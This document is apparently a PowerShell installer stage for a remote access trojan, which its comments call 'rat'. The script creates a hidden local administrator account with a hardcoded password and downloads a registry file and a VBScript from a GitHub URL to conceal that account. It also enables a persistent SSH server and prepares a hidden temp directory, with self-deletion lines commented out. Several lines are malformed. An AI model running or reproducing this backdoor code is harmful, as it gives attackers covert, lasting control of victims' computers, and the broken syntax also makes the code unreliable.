#builds resources for rat
#randome string for directories

function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
  }
  
#creates local admin 
function create_account {
    [CmdletBinding()]
    param (
        [string] $uname, 
        [securestring] $pword
    )
    begin {
    }
    process {
    New-LocalUser "$uname" -pword $pword -FullName "$uname" -Description "Temporary local admin" Write-Verbose "$uname local user crated" Add-LocalGroupMember  -Group "Administrators" -Member "$uname"
    }
    end {
    }
}
# create admin user
$uname = random_text
$pword = (ConvertTo-SecureString "onlyrat"--AsPlainText -Force) 
create_account -uname $uname -pword $pword

# registry to hide local admin

Invoke-WebRequest -Uri raw.githubusercontent.com/WayneTheGod/test2/main/onlyrat/files/admin.reg -OutFile "$reg_file.reg"

# visual basic script to register the registry 

Invoke-WebRequest -Uri raw.githubusercontent.com/WayneTheGod/test2/main/onlyrat/files/confirm.vbs -OutFile "$vbs_file.vbs".ps1

#install registry 
./"$reg_file.reg";"$vbs_file.vbs"

## variables 
$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = Get-Location

#enabling persistent ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~.0.1.0 Start-Service sshd Set-Service -Name sshd -StartupType 'Automatic' Get-NetFirewallRule -Name *ssh*


# goto temp , make working directory 
mkdir $path 
cd $path

#self delete
# cd $initial_dir
# del installer.ps1
